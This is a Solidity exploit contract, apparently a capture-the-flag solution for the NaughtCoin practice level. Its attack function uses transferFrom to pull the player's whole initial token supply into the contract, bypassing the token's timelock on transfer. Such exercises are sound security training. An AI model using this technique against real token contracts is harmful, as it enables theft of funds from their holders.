//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {NaughtCoin} from "./NaughtCoin.sol";

contract AttackNaughtCoin {
    NaughtCoin public naughtCoin;

    constructor(address _naughtCoin) {
        naughtCoin = NaughtCoin(_naughtCoin);
    }

    function attack() external {
        naughtCoin.transferFrom(
            address(naughtCoin.player()),
            address(this),
            naughtCoin.INITIAL_SUPPLY()
        );
    }
}
